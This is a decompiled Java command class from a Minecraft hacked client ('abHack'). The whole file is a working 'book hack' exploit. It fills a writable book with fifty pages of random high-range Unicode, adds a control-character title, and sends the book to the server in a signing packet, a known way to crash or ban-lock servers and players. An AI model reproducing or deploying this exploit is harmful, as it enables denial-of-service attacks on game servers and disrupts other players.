//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\L4J\Desktop\deobf workspace\1.12 stable mappings"!

//Decompiled by Procyon!

package me.abHack.features.command.commands;

import me.abHack.features.command.*;
import net.minecraft.init.*;
import java.util.*;
import java.util.stream.*;
import net.minecraft.nbt.*;
import io.netty.buffer.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import me.abHack.*;
import net.minecraft.item.*;

public class BookCommand extends Command
{
    public BookCommand() {
        super("book", new String[0]);
    }
    
    public void execute(final String[] array) {
        final ItemStack getHeldItemMainhand = BookCommand.mc.player.getHeldItemMainhand();
        if (getHeldItemMainhand.getItem() == Items.WRITABLE_BOOK) {
            final String s = new Random().ints(128, 1112063).map(n -> (n < 55296) ? n : (n + 2048)).limit(10500L).mapToObj(n2 -> String.valueOf((char)n2)).collect((Collector<? super Object, ?, String>)Collectors.joining());
            final NBTTagList list = new NBTTagList();
            for (int i = 0; i < 50; ++i) {
                list.appendTag((NBTBase)new NBTTagString(s.substring(i * 210, (i + 1) * 210)));
            }
            if (getHeldItemMainhand.hasTagCompound()) {
                assert getHeldItemMainhand.getTagCompound() != null;
                getHeldItemMainhand.getTagCompound().setTag("pages", (NBTBase)list);
            }
            else {
                getHeldItemMainhand.setTagInfo("pages", (NBTBase)list);
            }
            final StringBuilder obj = new StringBuilder();
            for (int j = 0; j < 16; ++j) {
                obj.append("\u0014\f");
            }
            getHeldItemMainhand.setTagInfo("author", (NBTBase)new NBTTagString(BookCommand.mc.player.getName()));
            getHeldItemMainhand.setTagInfo("title", (NBTBase)new NBTTagString(String.valueOf(obj)));
            final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
            packetBuffer.writeItemStack(getHeldItemMainhand);
            BookCommand.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BSign", packetBuffer));
            sendMessage(String.valueOf(new StringBuilder().append(OyVey.commandManager.getPrefix()).append("Book Hack Success!")));
        }
        else {
            sendMessage(String.valueOf(new StringBuilder().append(OyVey.commandManager.getPrefix()).append("b1g 3rr0r!")));
        }
    }
}
